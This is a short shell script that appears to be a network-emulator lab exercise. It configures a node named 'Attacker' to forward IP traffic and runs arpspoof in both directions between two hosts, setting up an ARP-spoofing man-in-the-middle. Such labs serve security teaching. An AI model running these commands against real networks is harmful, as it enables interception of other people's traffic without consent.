#!/bin/sh

himage Attacker route add default 10.0.0.1
himage Attacker sysctl -w net.inet.ip.forwarding=1
himage Attacker sysctl -w net.inet.ip.redirect=0

himage Attacker arpspoof -i eth0 -t 10.0.0.1 10.0.0.20 2> /dev/null &
himage Attacker arpspoof -i eth0 -t 10.0.0.20 10.0.0.1 2> /dev/null &
